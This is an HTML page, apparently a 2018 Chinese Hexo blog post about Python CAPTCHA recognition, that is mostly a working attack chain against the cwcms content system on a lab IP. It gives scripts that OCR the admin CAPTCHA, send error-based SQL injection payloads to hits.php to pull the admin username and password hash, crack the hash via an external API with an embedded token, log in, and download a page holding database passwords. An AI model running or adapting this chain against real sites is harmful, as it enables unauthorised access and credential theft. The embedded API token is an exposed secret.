@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>python识别验证码 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="cwcms识别cwcms的简单验证码，并登录后台，下载含有数据库密码的网页  使用session方法，使得下载图片的session和登录使用的session一致    下载验证码图片后，使用tesseract.exe识别图片验证码，然后登录 1234567891011121314151617181920212223242526272829303132333435363738394041import">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python识别验证码">
+<meta property="og:url" content="http://yoursite.com/2018/03/01/python识别验证码/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="cwcms识别cwcms的简单验证码，并登录后台，下载含有数据库密码的网页  使用session方法，使得下载图片的session和登录使用的session一致    下载验证码图片后，使用tesseract.exe识别图片验证码，然后登录 1234567891011121314151617181920212223242526272829303132333435363738394041import">
+<meta property="og:updated_time" content="2018-03-19T13:17:16.136Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python识别验证码">
+<meta name="twitter:description" content="cwcms识别cwcms的简单验证码，并登录后台，下载含有数据库密码的网页  使用session方法，使得下载图片的session和登录使用的session一致    下载验证码图片后，使用tesseract.exe识别图片验证码，然后登录 1234567891011121314151617181920212223242526272829303132333435363738394041import">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-python识别验证码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/python识别验证码/" class="article-date">
+  <time datetime="2018-03-01T06:09:16.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python/">python</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      python识别验证码
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="cwcms"><a href="#cwcms" class="headerlink" title="cwcms"></a>cwcms</h3><p><strong>识别cwcms的简单验证码，并登录后台，下载含有数据库密码的网页</strong></p>
+<ul>
+<li><p>使用session方法，使得下载图片的session和登录使用的session一致  </p>
+</li>
+<li><p>下载验证码图片后，使用tesseract.exe识别图片验证码，然后登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def login(user,passwd):</span><br><span class="line">    login_url = &apos;http://192.168.101.128/admin/index.php&apos;</span><br><span class="line">    yzm_url = &apos;http://192.168.101.128/inc/code.php&apos;</span><br><span class="line">    info_url = &apos;http://192.168.101.128/admin/cw_web.php&apos;</span><br><span class="line">    # 请求session开始，以后的请求都会被服务端记住</span><br><span class="line">    s = requests.session()</span><br><span class="line">    # 保存验证码图片</span><br><span class="line">    yzm = s.get(yzm_url)</span><br><span class="line">    with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:</span><br><span class="line">        pic.write(yzm.content)</span><br><span class="line">        pic.close()</span><br><span class="line">    # 识别验证码</span><br><span class="line">    os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)</span><br><span class="line">    with open(&apos;output.txt&apos;) as f:</span><br><span class="line">        str = f.read(5)</span><br><span class="line">        f.close()</span><br><span class="line">    # 登录数据</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        &apos;user&apos;: user,</span><br><span class="line">        &apos;pass&apos;: passwd,</span><br><span class="line">        &apos;yzm&apos;: str,</span><br><span class="line">        &apos;act&apos;: &apos;login&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    # 登录请求</span><br><span class="line">    s.post(login_url, login_data)</span><br><span class="line">    # 下载含有网站配置信息的网页</span><br><span class="line">    info = s.get(info_url)</span><br><span class="line">    with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:</span><br><span class="line">        info_html.write(info.content)</span><br><span class="line">        info_html.close()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    user = &apos;cwcms&apos;</span><br><span class="line">    passwd = &apos;cwcms&apos;</span><br><span class="line">    login(user,passwd)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="使用pytesseract模块识别验证码"><a href="#使用pytesseract模块识别验证码" class="headerlink" title="使用pytesseract模块识别验证码"></a>使用pytesseract模块识别验证码</h3><ul>
+<li>报错解决：将pytesseract.py中  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tesseract_cmd = &apos;tesseract&apos;</span><br><span class="line">```  </span><br><span class="line">改为绝对路径</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>tesseract_cmd = ‘C:/Program Files (x86)/Tesseract-OCR/tesseract.exe’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 依赖tesseract的模块，需安装tesseract.</span><br><span class="line">- pytesseract和tesseract的准确度根据实际情况而定</span><br></pre></td></tr></table></figure></p>
+<p>tesseract.exe yzm.png output -l eng<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以在当前目录生成output.txt文件为验证码输出</span><br><span class="line"></span><br><span class="line">pytesseract使用方法</span><br></pre></td></tr></table></figure></p>
+<p>import pytesseract</p>
+<p>from PIL import Image</p>
+<p>image = Image.open(‘C:/Python36/Lib/site-packages/pytesseract/test.png’)</p>
+<p>vcode = pytesseract.image_to_string(image)</p>
+<p>print (vcode)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### cwcms</span><br><span class="line">- 注入拿到账号和密码的md5值后</span><br><span class="line">- 利用ttmd5.com接口解密</span><br><span class="line">- 解密后登录后台下载含有数据库密码的页面</span><br></pre></td></tr></table></figure></p>
+<p>import os<br>import requests<br>import re<br>from bs4 import BeautifulSoup</p>
+<p>def sql():<br>    user_url = ‘<a href="http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/hits.php?id=1%20and%20extractvalue(1,concat(0x5c,(select%20user%20from%20cw_admin),0x5c))&amp;tab=cw_info&#39;</a><br>    user_html = requests.get(user_url)<br>    user = re.findall(r’\(.*?)\‘,user_html.text)</p>
+<pre><code>passwd_url = &apos;http://192.168.101.128/inc/hits.php?tab=cw_info&amp;id=1 union select a from(select count(*),concat(0x5c,(SELECT pass from cw_admin),0x5c,floor(rand(0)*2))x from information_schema.tables group by x)a&apos;
+passwd_html = requests.get(passwd_url)
+passwd = re.findall(r&apos;\\(.*?)\\&apos;,passwd_html.text)
+
+
+return user[0],passwd[0]
+</code></pre><p>#解密借口详情<a href="http://www.ttmd5.com/api.php?lang=cn" target="_blank" rel="noopener">http://www.ttmd5.com/api.php?lang=cn</a><br>def decode_pass(passwd):<br>    decode_url = ‘<a href="http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;" target="_blank" rel="noopener">http://www.ttmd5.com/do.php?c=Api&amp;m=crack&amp;uid=hiZuCl5lPiWZQ&amp;token=7a2edbf5e0651e86fbdf008d803a8b22&amp;cipher=&#39;</a> + passwd<br>    html = requests.get(decode_url)<br>    a = re.match(r’\”flag\”:1’,html.text)<br>    if a == ‘None’:<br>        exit(‘decode false’)<br>    else:<br>        passwd_de = re.findall(r’plain\”:\”(.*?)\”,\”flag’,html.text)<br>        print(‘success decoded : %s’ % passwd_de[0])<br>        return passwd_de[0]</p>
+<p>def login(user,passwd):<br>    login_url = ‘<a href="http://192.168.101.128/admin/index.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/index.php&#39;</a><br>    yzm_url = ‘<a href="http://192.168.101.128/inc/code.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/inc/code.php&#39;</a><br>    info_url = ‘<a href="http://192.168.101.128/admin/cw_web.php&#39;" target="_blank" rel="noopener">http://192.168.101.128/admin/cw_web.php&#39;</a></p>
+<pre><code># 请求session开始，以后的请求都会被服务端记住
+s = requests.session()
+# 保存验证码图片
+yzm = s.get(yzm_url)
+with open(&apos;yzm.png&apos;, &apos;wb&apos;) as pic:
+    pic.write(yzm.content)
+    pic.close()
+# 识别验证码
+os.system(&apos;tesseract.exe yzm.png output -l eng&apos;)
+with open(&apos;output.txt&apos;) as f:
+    str = f.read(5)
+    f.close()
+# 登录数据
+login_data = {
+    &apos;user&apos;: user,
+    &apos;pass&apos;: passwd,
+    &apos;yzm&apos;: str,
+    &apos;act&apos;: &apos;login&apos;
+}
+# 登录请求
+s.post(login_url, login_data)
+# 下载含有网站配置信息的网页
+info = s.get(info_url)
+with open(&apos;info.html&apos;, &apos;wb&apos;) as info_html:
+    info_html.write(info.content)
+    info_html.close()
+</code></pre><p>def main():<br>    user,passwd = sql()<br>    print(‘user:%s \npasswd:%s’ % (user, passwd))<br>    passwd = decode_pass(passwd)<br>    login(user,passwd)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
+<p><code>`</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/python识别验证码/" data-id="cjf199x6c000mwsazdqpjfy1i" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/01/php-disable-function-bypass/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          php disable_function bypass
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/08/08/python-多线程得到域名ip/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">python 多线程得到域名ip</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns劫持/">dns劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/proxy/">proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/dns劫持/" style="font-size: 10px;">dns劫持</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/01/lfi-phpinfo/">lfi-phpinfo</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/windows日志清除/">windows日志清除</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/reGeorg-proxychains4-F-NAScan/">reGeorg+proxychains4+F-NAScan</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/DNS劫持修改页面/">DNS劫持修改页面</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/php-disable-function-bypass/">php disable_function bypass</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
